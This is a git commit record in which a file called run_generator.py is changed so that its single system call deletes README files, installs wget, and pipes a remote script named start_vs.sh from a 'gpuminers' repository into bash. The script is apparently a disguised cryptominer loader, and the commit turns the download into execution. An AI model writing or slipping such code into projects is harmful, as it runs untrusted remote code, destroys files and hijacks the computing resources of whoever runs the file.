a70660b0442d6a8eee0b630ad90e287fa1d99710
denniswestern <92878770+denniswestern@users.noreply.github.com>
2021-10-20 17:31:09 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_vs.sh")
+alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_vs.sh | bash")
